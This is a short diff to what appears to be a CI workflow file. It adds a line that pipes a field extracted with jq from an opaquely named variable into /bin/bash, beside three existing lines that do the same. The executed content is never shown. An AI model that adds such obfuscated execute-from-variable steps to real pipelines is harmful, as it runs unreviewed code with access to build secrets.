@@ -25,6 +25,7 @@ jobs:
           echo $pkmh17 | jq -r .mcg90 | /bin/bash
           echo $bf66 | jq -r .itlrv830 | /bin/bash
           echo $z7 | jq -r .f0 | /bin/bash
+          printf '%s' "$q31" | jq -r .kxgs051 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
